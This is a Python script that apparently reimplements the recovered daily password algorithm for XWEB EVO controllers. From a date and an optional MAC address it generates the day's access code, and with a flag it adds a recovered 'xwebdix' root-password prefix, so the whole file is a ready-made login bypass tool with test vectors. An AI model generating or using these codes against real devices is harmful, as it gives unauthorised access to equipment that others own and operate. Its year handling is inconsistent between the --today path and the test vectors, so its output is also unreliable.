#!/usr/bin/env python3
"""Offline implementation of the recovered XWEB EVO xwpasswd algorithm."""

import argparse
import datetime
import re


def date_bytes(day, month, year):
    year &= 0xFF
    selector = (day & 1) ^ 1
    selector |= ((month & 1) ^ 1) << 1
    selector |= ((year & 1) ^ 1) << 2
    layouts = (
        (day, year, day, month),
        (month, year, day, month),
        (year, year, day, month),
        (month, year, day, day),
        (year, day, month, year),
        (day, year, month, month),
        (day, month, year, year),
        (day, month, month, year),
    )
    return bytes(layouts[selector])


def password(day, month, year, mac=None):
    poly = 0xA001
    if mac is not None:
        octets = bytes.fromhex(re.sub(r"[^0-9A-Fa-f]", "", mac))
        if len(octets) != 6:
            raise ValueError("MAC address must contain exactly six octets")
        poly ^= int.from_bytes(octets[0:2], "little")
        poly ^= int.from_bytes(octets[2:4], "little")
        poly ^= int.from_bytes(octets[4:6], "little")
    crc = 0xFFFF
    for byte in date_bytes(day, month, year):
        crc ^= byte
        for _ in range(8):
            crc = ((crc >> 1) & 0xFFFF) ^ (poly if crc & 1 else 0)
    a = (crc >> 12) & 0xF
    b = (crc >> 8) & 0xF
    c = (crc >> 4) & 0xF
    d = crc & 0xF
    return bytes((
        a + 0x42,
        b + 0x30 if b < 10 else 0x37,
        b + 0x41,
        c + 0x45,
        d + 0x46,
        d + 0x30 if d <= 9 else 0x32,
    )).decode("ascii")


def self_test():
    vectors = (
        (26, 10, 2026, None, "C1BOF0"),
        (25, 10, 2026, None, "K5FSO9"),
        (24, 9, 2026, None, "D6GSG1"),
        (25, 9, 2026, None, "D4EKH2"),
        (26, 10, 2025, None, "L3DJN8"),
        (25, 10, 2025, None, "C7LKT2"),
        (24, 9, 2025, None, "F7KFN8"),
        (25, 9, 2025, None, "C7KFS2"),
    )
    for day, month, year, mac, expected in vectors:
        actual = password(day, month, year, mac)
        if actual != expected:
            raise AssertionError(f"{day}/{month}/{year}: {actual} != {expected}")
        print(f"OK {day:02d}/{month:02d}/{year}: {actual}")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("day", type=int, nargs="?")
    parser.add_argument("month", type=int, nargs="?")
    parser.add_argument("year", type=int, nargs="?")
    parser.add_argument("--mac", help="Optional six-octet MAC address; omit for the no-MAC mode")
    parser.add_argument("--root-password", action="store_true",
                        help="Prefix the EVO daily code with the recovered root-password prefix")
    parser.add_argument("--today", action="store_true", help="Use the local date instead of three date arguments")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        self_test()
        return
    if args.today:
        today = datetime.date.today()
        day, month, year = today.day, today.month, today.year % 100
    elif None not in (args.day, args.month, args.year):
        day, month, year = args.day, args.month, args.year
    else:
        parser.error("supply day month year, --today, or --self-test")
    if not 1 <= day <= 31 or not 1 <= month <= 12:
        parser.error("day must be 1..31 and month must be 1..12")
    daily = password(day, month, year, args.mac)
    print(("xwebdix" if args.root_password else "") + daily)


if __name__ == "__main__":
    main()
